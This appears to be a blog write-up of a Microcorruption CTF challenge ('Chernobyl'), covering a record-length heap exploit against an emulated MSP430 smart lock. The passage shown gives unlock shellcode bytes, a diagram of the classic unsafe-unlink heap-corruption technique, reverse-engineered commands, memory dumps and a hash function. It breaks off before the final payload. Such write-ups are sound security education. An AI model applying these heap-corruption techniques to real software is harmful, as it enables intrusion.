<!DOCTYPE html>
<html><head>
    <title>Chernobyl — James Every</title>

    <link rel="shortcut icon" type="image/jpg" href="./images/favicon/glider.ico"/>

    <meta charset="utf-8">
    <meta http-equiv="Content-type" content="text/html; charset=UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">

    <meta name="description"
        content="A minimal, almost class-less CSS library to write modern websites that look like LaTeX documents." />
    <!-- <meta name="keywords" content="latex.css,css library,class-less css,latex css" /> -->
    <meta property="og:title" content="James Every" />
    <meta property="og:url" content="https://latex.now.sh" />
    <meta property="og:description"
        content="The writings and projects of the invividual known as James Every." />
    <meta property="og:type" content="website" />


    <link rel="stylesheet" href="./css/style.min.css" />
    <link rel="stylesheet" href="./css/slider.css" />
    <style type="text/css">

<link rel="preconnect" href="https://fonts.googleapis.com">
<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
<link href="https://fonts.googleapis.com/css2?family=IBM+Plex+Mono:ital,wght@0,100;0,200;0,300;0,400;0,500;0,600;0,700;1,100;1,200;1,300;1,400;1,500;1,600;1,700&display=swap" rel="stylesheet">

.language-ascii-art {
 display: inline-block; 
 font-family: "Lucida Console", Monaco, monospace;
 letter-spacing: -0.2em;
 line-height: 0.8em;
 text-shadow: 0 0 5px rgba(100,100,100,0.5);
}

.language-ascii-noshadows {
 display: inline-block; 
 letter-spacing: 0em;
 line-height: 1.16em;
}

    </style>    


</head>

<body>
<div>

<body id="top">
  <header>
    <h1>
	The Road to Chernobyl: World Records in Weird Machine Kolmogorov Complexity
    </h1>
            </h2>
    <p class="author">
      James Every <br />
      Cinco de Mayo, 2024
    </p>
  </header>

    <div class="abstract">
      <h2>Abstract</h2>

     <p>
      This page is a walkthrough for the world's shortest exploit for <a href="https://microcorruption.com/debugger/Chernobyl">Chernobyl</a>, the penultimate challenge from the <a href="https://microcorruption.com/map">Microcorruption</a> wargame originally developed by Matasano.
      </p>
    </div>

<h2>Executive Summary</h2>

<p>There are two copies of this heap exploit on Earth; this is how to become 1 in 10,000 by tying a ten-year world record.</p>

    <h2>
            Overview
    </h2>
    <b>Final Exploit:</b> 1328 UTC, July 20th, 2022
    <br>
    <b>Blockchain Timestamp:</b> 1831 UTC, July 20th, 2022
    <br>
    <b><a href="https://opentimestamps.org">Cryptographic Proof of Existence</a>:</b> <a href="./solutions/chernobyl/solution.txt">solution.txt</a> <a href="./solutions/chernobyl/solution.txt.ots">solution.txt.ots</a>
    <br>

    <h5>Rendering Note:</h5>
<p>There is a known issue with Android lacking a true monotype system font, which breaks many of the extended ASCII character set diagrams below. Please view this page on a Chrome or Firefox-based desktop browser to avoid rendering issues.<label for="sn-1" class="sidenote-toggle sidenote-number"></label>

<input type="checkbox" id="sn-1" class="sidenote-toggle" />
<span class="sidenote">
        Ideally on a Linux host.
</span></p>


<h3>Context</h3>

<p>During the better part of a decade, thousands of people attempted Microcorruption. <a href="https://web.archive.org/web/20220513195347/https://microcorruption.com/hall_of_fame/progress">Only a few hundred ever completed it,</a> even with walkthroughs available.</p>

<br>
      <figure>
        <img src="./images/chernobyl/microcorruption-overall-progress.png"
          loading="eager" alt="Overall level progress." />
      </figure>

      <br>
      <table>
        <caption>Percentage of user accounts with working exploits</caption>
        <thead>
          <tr>
            <th>Challenge</th>
            <th>Number</th>
            <th>Percent Successful</th>
          </tr>
        </thead>
        <tbody>
          <tr>
		  <td><code>First Challenge</code></td>
		  <td><code>[#1]</code></td>
		  <td><code>100%</code></td>
          </tr>
          <tr>
		  <td><code>Second Challenge</code></td>
		  <td><code>[#2]</code></td>
		  <td><code>58%</code></td>
          </tr>
          <tr>
		  <td><code>First Heap Exploitation Challenge</code></td>
		  <td><code>[#14]</code></td>
		  <td><code>5%</code></td>
          </tr>
          <tr>
		  <td><code>Last Heap Exploitation Challenge</code></td>
		  <td><code>[#18]</code></td>
		  <td><code>1.5%</code></td>
          </tr>
          <tr>
		  <td><code>Last Challenge</code></td>
		  <td><code>[#19]</code></td>
		  <td><code>1%</code></td>
          </tr>
        </tbody>
      </table>

      <h3>Enter Chernobyl</h3>

      <p>Ninety-eight percent of documented attempts fail before beating Chernobyl, the last heap exploitation challenge. The top 1% complete the series; the top 1% of the top 1% climb into single-digit rankings on the Chernobyl leaderboard.</p>

      <br>
      <table>
        <caption>Chernobyl Exploit Size Leaderboard: July 2022</caption>
        <thead>
          <tr>
            <th>Position</th>
            <th>Username</th>
            <th>Exploit Size (Bytes)</th>
          </tr>
        </thead>
        <tbody>
          <tr>
		  <td><code>1st</code></td>
		  <td><code>ThatsMe</code></td>
		  <td><code>59</code></td>
          </tr>
          <tr>
		  <td><code><mark>2nd</mark></code></td>
		  <td><code>b9ek</code></td>
		  <td><code>59</code></td>
          </tr>
          <tr>
          <tr>
		  <td><code>3rd</code></td>
		  <td><code><em>Unknown</em></code></td>
		  <td><code>60</code></td>
          </tr>
          <tr>
		  <td><code>4th</code></td>
		  <td><code><em>Unknown</em></code></td>
		  <td><code>60</code></td>
          </tr>
          <tr>
		  <td><code>5th</code></td>
		  <td><code><em>Unknown</em></code></td>
		  <td><code>61</code></td>
          </tr>
          <tr>
		  <td><code>6th</code></td>
		  <td><code><em>Unknown</em></code></td>
		  <td><code>61</code></td>
          </tr>
        </tbody>
      </table>


      <h3>The World Record</h3>

      <p>The record for the shortest working exploit is 59 bytes. Two people have achieved this: one in May of 2020, demonstrating that it was possible, and yours truly, independently discovering how to write that same exploit in July of 2022.</p>

      <p>This technical analysis documents how to tie the world record without fuzzing, given nothing but the length and the knowledge that it is possible.</p>

<h2>Technical Background</h2>

<p>Each challenge centers around a deliberately vulnerable smart lock. The goal is simple: write a software exploit to trigger an unlock.</p>

    <h3>System Architecture</h3>

    <p>The emulated device runs on the MSP430 instruction set architecture. It uses a 16-bit little-endian processor and has 64 kilobytes of RAM. The <a href="https://microcorruption.com/public/manual.pdf">official manual</a> includes the details, but relevant functionality is summarized below.</p>

    <h3>Interface</h3>
    <p>Several separate windows control the debugger functionality.</p>

    <br>
      <figure>
        <img src="./images/algiers/algiers-gui.png"
          loading="eager" alt="Debugger GUI." />
      </figure>

      <p>A user input prompt like the following is the device's external communication interface.</p>
      <br>
      <figure>
        <img src="./images/algiers/algiers-input-prompt.png"
          loading="eager" alt="Popup triggered by getsn interrupt." />
      </figure>

      <h3>Exploit Development Objective</h3>

      <p>The equivalent of popping a shell on this system is calling interrupt <code>0x7F</code>. Earlier challenges in the series implement this functionality with a dedicated function called <code>unlock_door</code>.</p>


      <br>
      <figure>
        <img src="./images/algiers/algiers-unlock-door-function.png"
          loading="eager" alt="The unlock door function." />
      </figure>

      <p>This function has been removed in the Chernobyl firmware, necessitating injecting shellcode to perform the same operation. Executing the following assembly is functionally equivalent to calling the <code>unlock_door</code> function.</p>

      <h5>Disassembly</h5>
      <pre><code>3240 00ff      mov     #0xff00, sr
b012 1000      call    #0x10
</code></pre>

<h5>Assembly</h5>
<pre><code>324000ffb0121000</code></pre>

<p>The following message is displayed in the interface when an exploit calls the interrupt successfully.</p>

      <br>
      <figure>
        <img src="./images/algiers/algiers-unlock.png"
          loading="eager" alt="Unlock status message." />
      </figure>


<h3>Previous Work</h3>
<h4>Overview of Reverse Engineering</h4>

<p>Other authors have published detailed explanations of the standard way to exploit this implementation. While the most common approach is covered herein, this analysis omits some reverse engineering details for brevity. Those wishing for a more thorough examination should consult Jaime Lightfoot's <a href="https://jaimelightfoot.com/blog/microcorruption-embedded-security-ctf-chernobyl/">walkthrough</a> for Chernobyl.</p>

<h4>The Algiers Heap Implementation</h4>

<p>The following exploits rely on techniques developed on an earlier heap exploitation challenge in the series—Algiers. These techniques, independently developed by the author, are described in a <a href="./algiers.html">previous walkthrough</a> that lays the groundwork for what is to follow.</p>


<h5>Novice Readers</h5>
<p>Those unfamiliar with exploit development should read the Algiers analysis first.</p>

<h5>Experienced Readers</h5>

<p>While those interested in a detailed analysis of the low-level internals of the implementation may find that page interesting for its own sake, it is not strictly essential. Those with a background in heap exploitation can proceed without reading it.</p>

<h3>Exploitation</h3>

<p>The heap implementation used on Chernobyl is essentially a stripped-down version of early dlmalloc. The basic technique is a variation of the original unsafe-unlink arbitrary write primitive published in <a href="http://phrack.org/issues/57/9.html">Phrack 57:9</a>, with heap overflows corrupting chunk metadata to perform arbitrary writes using the double-linked list pointers.</p>

<pre><code class='language-ascii-noshadows'>   ┌────────┬────────┬────────┬──────────────────────────┐
   │BACK    │FORWARD │  SIZE  │           DATA           │
   │POINTER │POINTER │        │                          │
   └────────┴────────┴────────┴──────────────────────────┘

   ┌────────┬────────┬────────┬──────────────────────────┐
   │  <mark>cccc</mark>  │  <mark>eeee</mark>  │  0021  │ bbbb 0000 0000 0000 .... │
   └─────┬──┴─────┬──┴────────┴──────────────────────────┘
      ▲  │        │
 ┌────┘  │        │
 │       │        └─────────────────────────────────────────────┐
 │       │                                                      │
 │       └───────────────────────────────────────────────────┐  │
 │                                                           │  │
 │ ┌────────┬────────┬────────┬──────────────────────────┐   │  │
 └─┤  241e  │  2408  │  1f9c  │ 0000 0000 0000 0000 .... │   │  │
   └────────┴────────┴────────┴──────────────────────────┘   │  │
                                                             │  │
                                                             │  │
                                                             │  │
                 ┌───────────────────────────────────────────┘  │
                 │                                              │
                 │                                              │
                 │                                              │
                 │                                              │
                 ▼                                              │
   ┌────────┬────────┬────────┬────────┬────────┐               │
   │DATA    │  0000  │  <mark>eeee</mark>  │  002c  │  ....  │               │
   ├────────┼────────┼────────┼────────┼────────┤               │
   │ADDRESS │ 0xcccc │ 0xccce │ 0xccd0 │  ....  │               │
   └────────┴────────┴────────┴────────┴────────┘               │
                                                                │
                 ┌──────────────────────────────────────────────┘
                 ▼
   ┌────────┬────────┬────────┬────────┬────────┐
   │DATA    │  <mark>cccc</mark>  │  0000  │  0000  │  ....  │
   ├────────┼────────┼────────┼────────┼────────┤
   │ADDRESS │ 0xeeee │ 0xeef0 │ 0xeef2 │  ....  │
   └────────┴────────┴────────┴────────┴────────┘
</code></pre>

<h2>High-Level Analysis</h2>

<p>Running the firmware results in the following message printing to the I/O console:</p>

<pre><code>Welcome to the lock controller.
You can open the door by entering 'access [your name] [pin]'
</code></pre>

<p>Test this functionality with the following command.</p>

<h5>Input:</h5>

<pre><code><mark>access admin 1111</mark></code></pre>

<h5>Output:</h5>

<pre><code>No such box.</code></pre>

<h5>Input:</h5>
<pre><code><mark>help</mark></code></pre>

<h5>Output:</h5>
<pre><code>Invalid command.</code></pre>

<p>The processor halts execution at this point, requiring a reset.</p>

<h3>Status Messages</h3>
<p>Opening the firmware in Ghidra and looking at the defined strings reveals other behaviors. In particular, take note of the "adding user account" string.</p>

<br>
      <table>
        <caption>Defined Strings</caption>
        <thead>
          <tr>
            <th>String Address</th>
            <th>String</th>
          </tr>
        </thead>
        <tbody>

          <tr>
		<td>4569</td>
		<td>"@%x [alloc] [p %x] [n %x] [s %x]\n"</td>
	  </td>

          <tr>
		<td>4598</td>
		<td>"@%x [freed] [p %x] [n %x] [s %x]\n"</td>
	  </td>

          <tr>
		<td>465e</td>
		<td>"Heap exausted; aborting."</td>
	  </td>

          <tr>
		<td>4a38</td>
		<td>"Welcome to the lock controller."</td>
	  </td>

          <tr>
		<td>4a58</td>
		<td>"You can open the door by entering 'access [your name] [pin]'"</td>
	  </td>

          <tr>
		<td>4a96</td>
		<td>"No such box."</td>
	  </td>

          <tr>
		<td>4aa3</td>
		<td>"Access granted."</td>
	  </td>

          <tr>
		<td>4ab3</td>
		<td>"Access granted; but account not activated."</td>
	  </td>

          <tr>
		<td>4ade</td>
		<td>"Aceess denied"</td>
	  </td>

          <tr>
		<td>4aec</td>
		<td>"Can not have a pin with high bit set."</td>
	  </td>

          <tr>
		<td>4b12</td>
		<td>"User already has an account."</td>
	  </td>

          <tr>
		<td>4b2f</td>
		<td><mark>"Adding user account %s with pin %x.\n"</mark></td>
	  </td>

          <tr>
		<td>4b54</td>
		<td>"Invalid command."</td>
	  </td>
        </tbody>
      </table>


<h3>Undocumented Commands</h3>

<p>Skipping over some reverse engineering, adding a new user account is possible via the following command.</p>

<pre><code><mark>new [your name] [pin]</mark></code></pre>

<h5>Input:</h5>

<pre><code>new admin 1111</code></pre>

<h5>Output:</h5>

<pre><code>Adding user account admin with pin 0457.</code></pre>

<p>It is then possible to attempt to access that account.</p>

<h5>Input:</h5>
<pre><code>access admin 1111</code></pre>

<h5>Output:</h5>
<pre><code>Access granted; but account not activated.</code></pre>

<p>Omitting more reverse engineering: a working exploit requires memory corruption because, as mentioned earlier, no function exists in the firmware to trigger the unlock interrupt. It does not matter whether an account is "activated" because the authentication functionality is essentially a stub.</p>

<h3>Batching Commands</h3>
<p>It is also possible to batch commands by separating them with semicolons.</p>

<h5>Input:</h5>
<pre><code>new user1 1111;new user2 2222;access user1 1111</code></pre>

<h5>Output:</h5>
<pre><code>Adding user account user1 with pin 0457.
Adding user account user2 with pin 08ae.
Access granted; but account not activated.
</code></pre>

<h2>Memory Internals</h2>
<p>Consider what happens when adding ten users.</p>

<h5>Input:</h5>
<pre><code>new user1 1000;new user2 1000;new user3 1000;new user4 1000;new user5 1000;new user6 1000;new user7 1000;new user8 1000;new user9 1000;new user10 1000</code></pre>

<h5>Output:</h5>
<pre><code>Adding user account user1 with pin 03e8.
Adding user account user2 with pin 03e8.
Adding user account user3 with pin 03e8.
Adding user account user4 with pin 03e8.
Adding user account user5 with pin 03e8.
Adding user account user6 with pin 03e8.
Adding user account user7 with pin 03e8.
Adding user account user8 with pin 03e8.
Adding user account user9 with pin 03e8.
Adding user account user10 with pin 03e8.
</code></pre>

<p>This results in the following changes in heap memory.</p>
<br>

<ul id="nav">
  <li><a href="#memory-before-read">Memory Before Batched Commands</a></li>
  <li><a href="#memory-after-read">Memory After Batched Commands</a></li>
</ul>
<div id="slides">
  <section id="memory-before-read">
	<pre><code>5000: 0050 1050 1500 0000 0300 0500 1650 2c50   .P.P.........P,P
5010: 0050 2650 2100 4250 a250 0251 6251 c251   .P&amp;P!.BP.P.QbQ.Q
5020: 2252 8252 e252 1050 3c50 2100 0000 0000   &quot;R.R.R.P&lt;P!.....
5030: 0000 0000 0000 0000 0000 0000 2650 9c50   ............&amp;P.P
5040: b500 0000 0000 0000 0000 0000 0000 0000   ................
5050: 0000 0000 0000 0000 0000 0000 0000 0000   ................
5060: *  
5090: 0000 0000 0000 0000 0000 0000 3c50 fc50   ............&lt;P.P
50a0: b500 0000 0000 0000 0000 0000 0000 0000   ................
50b0: 0000 0000 0000 0000 0000 0000 0000 0000   ................
50c0: *  
50f0: 0000 0000 0000 0000 0000 0000 9c50 5c51   .............P\Q
5100: b500 0000 0000 0000 0000 0000 0000 0000   ................
5110: 0000 0000 0000 0000 0000 0000 0000 0000   ................
5120: *  
5150: 0000 0000 0000 0000 0000 0000 fc50 bc51   .............P.Q
5160: b500 0000 0000 0000 0000 0000 0000 0000   ................
5170: 0000 0000 0000 0000 0000 0000 0000 0000   ................
5180: *  
51b0: 0000 0000 0000 0000 0000 0000 5c51 1c52   ............\Q.R
51c0: b500 0000 0000 0000 0000 0000 0000 0000   ................
51d0: 0000 0000 0000 0000 0000 0000 0000 0000   ................
51e0: *  
5210: 0000 0000 0000 0000 0000 0000 bc51 7c52   .............Q|R
5220: b500 0000 0000 0000 0000 0000 0000 0000   ................
5230: 0000 0000 0000 0000 0000 0000 0000 0000   ................
5240: *  
5270: 0000 0000 0000 0000 0000 0000 1c52 dc52   .............R.R
5280: b500 0000 0000 0000 0000 0000 0000 0000   ................
5290: 0000 0000 0000 0000 0000 0000 0000 0000   ................
52a0: *  
52d0: 0000 0000 0000 0000 0000 0000 7c52 3c53   ............|R&lt;S
52e0: b500 0000 0000 0000 0000 0000 0000 0000   ................
52f0: 0000 0000 0000 0000 0000 0000 0000 0000   ................
5300: *  
5330: 0000 0000 0000 0000 0000 0000 dc52 0050   .............R.P
5340: 7cf9 0000 0000 0000 0000 0000 0000 0000   |...............
5350: 0000 0000 0000 0000 0000 0000 0000 0000   ................
5360: *</code></pre>
  </section>
  <section id="memory-after-read">
<pre><code>5000: 0050 1050 1500 0a00 0300 0500 1650 2c50   .P.P.........P,P
5010: 0050 2650 2100 4250 a250 0251 6251 c251   .P&amp;P!.BP.P.QbQ.Q
5020: 2252 8252 e252 1050 3c50 2100 0100 0100   &quot;R.R.R.P&lt;P!.....
5030: 0200 0100 0100 0100 0200 0100 2650 9c50   ............&amp;P.P
5040: b500 7573 6572 3300 0000 0000 0000 0000   ..<mark>user3</mark>.........
5050: 0000 e803 0000 0000 0000 0000 0000 0000   ................
5060: 0000 0000 0000 0000 0000 0000 0000 0000   ................
5070: *  
5090: 0000 0000 0000 0000 0000 0000 3c50 fc50   ............&lt;P.P
50a0: b500 7573 6572 3200 0000 0000 0000 0000   ..<mark>user2</mark>.........
50b0: 0000 e803 0000 0000 0000 0000 0000 0000   ................
50c0: 0000 0000 0000 0000 0000 0000 0000 0000   ................
50d0: *  
50f0: 0000 0000 0000 0000 0000 0000 9c50 5c51   .............P\Q
5100: b500 7573 6572 3100 0000 0000 0000 0000   ..<mark>user1</mark>.........
5110: 0000 e803 7573 6572 3900 0000 0000 0000   ....<mark>user9</mark>.......
5120: 0000 0000 e803 0000 0000 0000 0000 0000   ................
5130: 0000 0000 0000 0000 0000 0000 0000 0000   ................
5140: *  
5150: 0000 0000 0000 0000 0000 0000 fc50 bc51   .............P.Q
5160: b500 7573 6572 3800 0000 0000 0000 0000   ..<mark>user8</mark>.........
5170: 0000 e803 0000 0000 0000 0000 0000 0000   ................
5180: 0000 0000 0000 0000 0000 0000 0000 0000   ................
5190: *  
51b0: 0000 0000 0000 0000 0000 0000 5c51 1c52   ............\Q.R
51c0: b500 7573 6572 3700 0000 0000 0000 0000   ..<mark>user7</mark>.........
51d0: 0000 e803 0000 0000 0000 0000 0000 0000   ................
51e0: 0000 0000 0000 0000 0000 0000 0000 0000   ................
51f0: *  
5210: 0000 0000 0000 0000 0000 0000 bc51 7c52   .............Q|R
5220: b500 7573 6572 3600 0000 0000 0000 0000   ..<mark>user6</mark>.........
5230: 0000 e803 0000 0000 0000 0000 0000 0000   ................
5240: 0000 0000 0000 0000 0000 0000 0000 0000   ................
5250: *  
5270: 0000 0000 0000 0000 0000 0000 1c52 dc52   .............R.R
5280: b500 7573 6572 3500 0000 0000 0000 0000   ..<mark>user5</mark>.........
5290: 0000 e803 7573 6572 3130 0000 0000 0000   ....<mark>user10</mark>......
52a0: 0000 0000 e803 0000 0000 0000 0000 0000   ................
52b0: 0000 0000 0000 0000 0000 0000 0000 0000   ................
52c0: *  
52d0: 0000 0000 0000 0000 0000 0000 7c52 3c53   ............|R&lt;S
52e0: b500 7573 6572 3400 0000 0000 0000 0000   ..<mark>user4</mark>.........
52f0: 0000 e803 0000 0000 0000 0000 0000 0000   ................
5300: 0000 0000 0000 0000 0000 0000 0000 0000   ................
5310: *  
5330: 0000 0000 0000 0000 0000 0000 dc52 0050   .............R.P
5340: 7cf9 0000 0000 0000 0000 0000 0000 0000   |...............
5350: 0000 0000 0000 0000 0000 0000 0000 0000   ................
5360: *  
</code></pre>
  </section>
</div>


<h3>Hash Function</h3>
<p>There are eight different groupings of usernames. This structure is a hash table with eight buckets. The strings "<code>user1</code>" and "<code>user9</code>" are stored in the same bucket, which is why they are closer together in memory than "<code>user6</code>" and "<code>user7</code>". The function determining which account ends up in which bucket is as follows.</p>

<h5>Disassembly</h5>

<pre><code>480e &lt;hash&gt;
480e:  0e4f           mov	r15, r14
4810:  0f43           clr	r15
4812:  0b3c           jmp	$+0x18 &lt;hash+0x1c&gt;
4814:  6d4e           mov.b	@r14, r13
4816:  8d11           sxt	r13
4818:  0d5f           add	r15, r13
481a:  0f4d           mov	r13, r15
481c:  0f5f           add	r15, r15
481e:  0f5f           add	r15, r15
4820:  0f5f           add	r15, r15
4822:  0f5f           add	r15, r15
4824:  0f5f           add	r15, r15
4826:  0f8d           sub	r13, r15
4828:  1e53           inc	r14
482a:  ce93 0000      tst.b	0x0(r14)
482e:  f223           jnz	$-0x1a &lt;hash+0x6&gt;
4830:  3041           ret
</code></pre>

<h5>Python Reimplementation</h5>
<pre><code>#!&#x2F;usr&#x2F;bin&#x2F;python3
import binascii

def hash_username(s):
    s &#x3D; binascii.unhexlify(s)

    r15 &#x3D; 0
    for r13 in s:
        if (r13 &amp; 0x80) &#x3D;&#x3D; 128:
            r13 &#x3D; &quot;ff&quot; + &quot;{0:0{1}x}&quot;.format(r13,2)
        else:
            r13 &#x3D; &quot;00&quot; + &quot;{0:0{1}x}&quot;.format(r13,2)

        r13 &#x3D; int(r13, 16)
        r13 &#x3D; r15 + r13
        r15 &#x3D; r13

        r15 &#x3D; (r15 + r15) &amp; 0xffff
        r15 &#x3D; (r15 + r15) &amp; 0xffff
        r15 &#x3D; (r15 + r15) &amp; 0xffff
        r15 &#x3D; (r15 + r15) &amp; 0xffff
        r15 &#x3D; (r15 + r15) &amp; 0xffff

        r15 &#x3D; (r15 + (0x10000 - r13)) &amp; 0xffff

    return r15
</code></pre>

<p>The following code calculates the index for the hash bucket that will store a given username.</p>

<pre><code>python3 -i hash.py
&gt;&gt;&gt; hash_username(binascii.hexlify(b'user1')) % 8
2
</code></pre>

<h3>Identifying Hash Buckets</h3>

<br>
<ul id="nav">
  <li><a href="#hash-bucket-0">Hash Bucket 0</a></li>
  <li><a href="#hash-bucket-1">Hash Bucket 1</a></li>
  <li><a href="#hash-bucket-2">Hash Bucket 2</a></li>
  <li><a href="#hash-bucket-3">Hash Bucket 3</a></li>
  <li><a href="#hash-bucket-4">Hash Bucket 4</a></li>
  <li><a href="#hash-bucket-5">Hash Bucket 5</a></li>
  <li><a href="#hash-bucket-6">Hash Bucket 6</a></li>
  <li><a href="#hash-bucket-7">Hash Bucket 7</a></li>
</ul>

<div id="slides">
  <section id="hash-bucket-0">

	  <h5>Hash Bucket 0</h5>

<pre><code>&gt;&gt;&gt; hash_username(binascii.hexlify(b'user3')) % 8
<mark>0</mark>
</code></pre>

<pre><code>5000: 0050 1050 1500 0a00 0300 0500 1650 2c50   .P.P.........P,P
5010: 0050 2650 2100 4250 a250 0251 6251 c251   .P&amp;P!.BP.P.QbQ.Q
5020: 2252 8252 e252 1050 3c50 2100 0100 0100   &quot;R.R.R.P&lt;P!.....
5030: 0200 0100 0100 0100 0200 0100 2650 9c50   ............&amp;P.P
5040: b500 <mark>7573 6572 3300 0000 0000 0000 0000</mark>   ..user3.........
5050: <mark>0000 e803 0000 0000 0000 0000 0000 0000</mark>   ................
5060: <mark>0000 0000 0000 0000 0000 0000 0000 0000</mark>   ................
5070: *  
5090: <mark>0000 0000 0000 0000 0000 0000</mark> 3c50 fc50   ............&lt;P.P
50a0: b500 7573 6572 3200 0000 0000 0000 0000   ..user2.........
50b0: 0000 e803 0000 0000 0000 0000 0000 0000   ................
50c0: 0000 0000 0000 0000 0000 0000 0000 0000   ................
50d0: *  
50f0: 0000 0000 0000 0000 0000 0000 9c50 5c51   .............P\Q
5100: b500 7573 6572 3100 0000 0000 0000 0000   ..user1.........
5110: 0000 e803 7573 6572 3900 0000 0000 0000   ....user9.......
5120: 0000 0000 e803 0000 0000 0000 0000 0000   ................
5130: 0000 0000 0000 0000 0000 0000 0000 0000   ................
5140: *  
5150: 0000 0000 0000 0000 0000 0000 fc50 bc51   .............P.Q
5160: b500 7573 6572 3800 0000 0000 0000 0000   ..user8.........
5170: 0000 e803 0000 0000 0000 0000 0000 0000   ................
5180: 0000 0000 0000 0000 0000 0000 0000 0000   ................
5190: *  
51b0: 0000 0000 0000 0000 0000 0000 5c51 1c52   ............\Q.R
51c0: b500 7573 6572 3700 0000 0000 0000 0000   ..user7.........
51d0: 0000 e803 0000 0000 0000 0000 0000 0000   ................
51e0: 0000 0000 0000 0000 0000 0000 0000 0000   ................
51f0: *  
5210: 0000 0000 0000 0000 0000 0000 bc51 7c52   .............Q|R
5220: b500 7573 6572 3600 0000 0000 0000 0000   ..user6.........
5230: 0000 e803 0000 0000 0000 0000 0000 0000   ................
5240: 0000 0000 0000 0000 0000 0000 0000 0000   ................
5250: *  
5270: 0000 0000 0000 0000 0000 0000 1c52 dc52   .............R.R
5280: b500 7573 6572 3500 0000 0000 0000 0000   ..user5.........
5290: 0000 e803 7573 6572 3130 0000 0000 0000   ....user10......
52a0: 0000 0000 e803 0000 0000 0000 0000 0000   ................
52b0: 0000 0000 0000 0000 0000 0000 0000 0000   ................
52c0: *  
52d0: 0000 0000 0000 0000 0000 0000 7c52 3c53   ............|R&lt;S
52e0: b500 7573 6572 3400 0000 0000 0000 0000   ..user4.........
52f0: 0000 e803 0000 0000 0000 0000 0000 0000   ................
5300: 0000 0000 0000 0000 0000 0000 0000 0000   ................
5310: *  
5330: 0000 0000 0000 0000 0000 0000 dc52 0050   .............R.P
5340: 7cf9 0000 0000 0000 0000 0000 0000 0000   |...............
5350: 0000 0000 0000 0000 0000 0000 0000 0000   ................
5360: *  
</code></pre>
  </section>
  <section id="hash-bucket-1">

	  <h5>Hash Bucket 1</h5>

<pre><code>&gt;&gt;&gt; hash_username(binascii.hexlify(b'user2')) % 8
<mark>1</mark>
</code></pre>

<pre><code>5000: 0050 1050 1500 0a00 0300 0500 1650 2c50   .P.P.........P,P
5010: 0050 2650 2100 4250 a250 0251 6251 c251   .P&amp;P!.BP.P.QbQ.Q
5020: 2252 8252 e252 1050 3c50 2100 0100 0100   &quot;R.R.R.P&lt;P!.....
5030: 0200 0100 0100 0100 0200 0100 2650 9c50   ............&amp;P.P
5040: b500 7573 6572 3300 0000 0000 0000 0000   ..user3.........
5050: 0000 e803 0000 0000 0000 0000 0000 0000   ................
5060: 0000 0000 0000 0000 0000 0000 0000 0000   ................
5070: *  
5090: 0000 0000 0000 0000 0000 0000 3c50 fc50   ............&lt;P.P
50a0: b500 <mark>7573 6572 3200 0000 0000 0000 0000</mark>   ..user2.........
50b0: <mark>0000 e803 0000 0000 0000 0000 0000 0000</mark>   ................
50c0: <mark>0000 0000 0000 0000 0000 0000 0000 0000</mark>   ................
50d0: *  
50f0: <mark>0000 0000 0000 0000 0000 0000</mark> 9c50 5c51   .............P\Q
5100: b500 7573 6572 3100 0000 0000 0000 0000   ..user1.........
5110: 0000 e803 7573 6572 3900 0000 0000 0000   ....user9.......
5120: 0000 0000 e803 0000 0000 0000 0000 0000   ................
5130: 0000 0000 0000 0000 0000 0000 0000 0000   ................
5140: *  
5150: 0000 0000 0000 0000 0000 0000 fc50 bc51   .............P.Q
5160: b500 7573 6572 3800 0000 0000 0000 0000   ..user8.........
5170: 0000 e803 0000 0000 0000 0000 0000 0000   ................
5180: 0000 0000 0000 0000 0000 0000 0000 0000   ................
5190: *  
51b0: 0000 0000 0000 0000 0000 0000 5c51 1c52   ............\Q.R
51c0: b500 7573 6572 3700 0000 0000 0000 0000   ..user7.........
51d0: 0000 e803 0000 0000 0000 0000 0000 0000   ................
51e0: 0000 0000 0000 0000 0000 0000 0000 0000   ................
51f0: *  
5210: 0000 0000 0000 0000 0000 0000 bc51 7c52   .............Q|R
5220: b500 7573 6572 3600 0000 0000 0000 0000   ..user6.........
5230: 0000 e803 0000 0000 0000 0000 0000 0000   ................
5240: 0000 0000 0000 0000 0000 0000 0000 0000   ................
5250: *  
5270: 0000 0000 0000 0000 0000 0000 1c52 dc52   .............R.R
5280: b500 7573 6572 3500 0000 0000 0000 0000   ..user5.........
5290: 0000 e803 7573 6572 3130 0000 0000 0000   ....user10......
52a0: 0000 0000 e803 0000 0000 0000 0000 0000   ................
52b0: 0000 0000 0000 0000 0000 0000 0000 0000   ................
52c0: *  
52d0: 0000 0000 0000 0000 0000 0000 7c52 3c53   ............|R&lt;S
52e0: b500 7573 6572 3400 0000 0000 0000 0000   ..user4.........
52f0: 0000 e803 0000 0000 0000 0000 0000 0000   ................
5300: 0000 0000 0000 0000 0000 0000 0000 0000   ................
5310: *  
5330: 0000 0000 0000 0000 0000 0000 dc52 0050   .............R.P
5340: 7cf9 0000 0000 0000 0000 0000 0000 0000   |...............
5350: 0000 0000 0000 0000 0000 0000 0000 0000   ................
5360: *  
</code></pre>
  </section>
  <section id="hash-bucket-2">

	  <h5>Hash Bucket 2</h5>

<pre><code>&gt;&gt;&gt; hash_username(binascii.hexlify(b'user1')) % 8
<mark>2</mark>
&gt;&gt;&gt; hash_username(binascii.hexlify(b'user9')) % 8
<mark>2</mark>
</code></pre>

<pre><code>5000: 0050 1050 1500 0a00 0300 0500 1650 2c50   .P.P.........P,P
5010: 0050 2650 2100 4250 a250 0251 6251 c251   .P&amp;P!.BP.P.QbQ.Q
5020: 2252 8252 e252 1050 3c50 2100 0100 0100   &quot;R.R.R.P&lt;P!.....
5030: 0200 0100 0100 0100 0200 0100 2650 9c50   ............&amp;P.P
5040: b500 7573 6572 3300 0000 0000 0000 0000   ..user3.........
5050: 0000 e803 0000 0000 0000 0000 0000 0000   ................
5060: 0000 0000 0000 0000 0000 0000 0000 0000   ................
5070: *  
5090: 0000 0000 0000 0000 0000 0000 3c50 fc50   ............&lt;P.P
50a0: b500 7573 6572 3200 0000 0000 0000 0000   ..user2.........
50b0: 0000 e803 0000 0000 0000 0000 0000 0000   ................
50c0: 0000 0000 0000 0000 0000 0000 0000 0000   ................
50d0: *  
50f0: 0000 0000 0000 0000 0000 0000 9c50 5c51   .............P\Q
5100: b500 <mark>7573 6572 3100 0000 0000 0000 0000</mark>   ..user1.........
5110: <mark>0000 e803 7573 6572 3900 0000 0000 0000</mark>   ....user9.......
5120: <mark>0000 0000 e803 0000 0000 0000 0000 0000</mark>   ................
5130: <mark>0000 0000 0000 0000 0000 0000 0000 0000</mark>   ................
5140: *  
